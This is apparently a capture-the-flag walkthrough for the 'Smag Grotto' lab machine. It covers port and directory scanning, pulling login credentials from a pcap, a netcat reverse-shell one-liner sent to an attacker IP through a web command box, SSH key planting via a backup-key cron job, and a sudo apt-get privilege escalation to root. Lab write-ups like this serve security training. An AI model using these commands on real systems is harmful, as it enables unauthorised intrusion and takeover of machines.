Walkthrough about Smag Grotto

Jan 23, 2022

---------------------------------------------

We saw the site but there is nothing there, so we have to use nmap to see for opening ports.

```
PORT     STATE    SERVICE       VERSION
22/tcp   open     ssh           OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp   open     http          Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 1.3K  2020-06-05 10:56  admin.php
| 1.5K  2020-06-05 10:45  login.php
| 139K  2020-06-05 10:19  materialize.min.css
|_
|_http-server-header: Apache/2.4.18 (Ubuntu)
1073/tcp filtered bridgecontrol
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Then, also use feroxbuster for the directories
```
301        9l       28w      307c http://10.10.1.79/mail
403        9l       28w      275c http://10.10.1.79/server-status
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_1_79-1642868548.state ...
[#########>----------] - 10m   207271/441090  12m     found:2       errors:34     
[#########>----------] - 10m   103816/220545  159/s   http://10.10.1.79
[#########>----------] - 10m   103453/220545  160/s   http://10.10.1.79/mail
```

After we use the feroxbuster we did see the "/mail" directory.
Then, we go there and see a .pcap file which we can open in the wireshark.
Then, go analyze the port 80 which we can follow through the TCP Stream and then we did see the details like username and pass.
But, we did not yet input in directly into the ssh port.

Instead we did look around in the pcap file and found out the /login.php,
And it the host is "development.smag.thm", so we will put this in our /etc/hosts
```
sudo vim /etc/hosts
(in the lowest part of the file we will insert this.)
10.10.1.79 development.smag.thm
```

Then go visit the site which is "htt://development.smg.thm" and try to put the details we got in the pcap file. 
After that we did see the enter a command section of the website.
Go try put a reverse shell in the input box.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.2.111 1337 >/tmp/f
```

Then use nc to listen to the port to get the connection from the reverse shell.

```
nc -lvnp 1337
```

After that use linPeas to have a vulnerability scan throughout the system.
And after a few seconds you will see the cronjob that is taking the user's backup SSH key and adding it to the authorised keys.

So, we have to create our own SSH key to replace the user's backup SSH for us to access the user account through ssh port/service.

```
ssh-keygen -o
```

Create a ssh file and name the file like "id_rsa_test"
Then it will create automatically.

```
cat id_rsa_test.pub 
```

Then we will replace now the current user's backup SSH 

```
echo "_____(the SSH key)___" > jake_id_rsa.pub.backup
```

Remember to change the permission of the SSH Key to "chmod 600" because the keys want to be read only and write by the root.

```
ssh -i id_rsa_test jake@10.10.1.79 
```

Then we will get the connection and we will be connected to the server as the user jake

```
ls -la
cat user.txt
```

Then we will use this command to see our commands that we can use as sudo 

```
sudo -l
```

After that we saw the command and search it in the GTFOBins


```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

Then we get the privilege to the root.

